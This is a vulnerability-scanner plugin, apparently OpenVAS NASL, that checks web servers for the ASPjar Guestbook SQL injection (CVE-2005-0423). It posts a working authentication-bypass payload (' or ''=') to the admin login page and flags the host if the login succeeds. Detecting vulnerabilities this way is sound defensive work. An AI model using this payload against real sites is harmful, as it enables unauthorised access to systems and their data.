if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.16389" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_cve_id( "CVE-2005-0423" );
	script_bugtraq_id( 12521, 12823 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_name( "ASPjar Guestbook SQL Injection" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2005 Noam Rathaus" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution", value: "Delete this application." );
	script_tag( name: "summary", value: "The remote host is running ASPJar's GuestBook, a guestbook
  application written in ASP.

  The remote version of this software is vulnerable to a SQL injection vulnerability which allows a
  remote attacker to execute arbitrary SQL statements against the remote DB.

  It is also vulnerable to an input validation vulnerability which may allow an attacker to perform
  a cross site scripting attack using the remote host." );
	script_tag( name: "qod_type", value: "remote_app" );
	script_tag( name: "solution_type", value: "Mitigation" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_asp( port: port )){
	exit( 0 );
}
useragent = http_get_user_agent();
host = http_host_name( port: port );
for dir in nasl_make_list_unique( "/", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	url = dir + "/admin/login.asp?Mode=login";
	req = NASLString( "POST ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "User-Agent: ", useragent, "\\r\\n", "Accept: text/html\\r\\n", "Accept-Encoding: none\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: 56\\r\\n\\r\\n", "User=&Password=%27+or+%27%27%3D%27&Submit=++++Log+In++++" );
	res = http_keepalive_send_recv( port: port, data: req, bodyonly: TRUE );
	if(ContainsString( res, "You are Logged in!" ) && ContainsString( res, "Login Page" )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

